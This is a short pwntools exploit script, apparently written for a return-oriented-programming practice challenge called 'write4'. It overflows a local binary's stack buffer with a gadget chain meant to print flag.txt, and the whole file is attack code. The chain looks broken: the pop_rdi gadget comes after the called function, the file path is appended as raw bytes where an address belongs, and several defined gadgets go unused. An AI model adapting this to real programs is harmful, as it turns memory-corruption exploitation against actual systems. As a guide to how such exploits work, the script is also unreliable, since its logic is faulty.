#!/usr/bin/env python3
from pwn import *

nop = b"\x90"
buffer = 0x20
flag = b"./flag.txt"
formatter = b"%x."

usefulFunction = p64(0x0000000000400617)
usefulGadgets = p64(0x0000000000400628)
pwnme_plt = p64(0x0000000000400500)
printfile_plt = p64(0x0000000000400510)
pop_rdi = p64(0x0000000000400693)
pop_rsp = p64(0x000000000040068d)
pop_r14 = p64(0x0000000000400690)
ret = p64(0x00000000004004e6)

payload = (nop * (buffer + 8)) + usefulFunction + pop_rdi + flag

context.update(arch="amd64", os="linux")
p = process("./write4")

p.send(payload)
print(p.recvall())
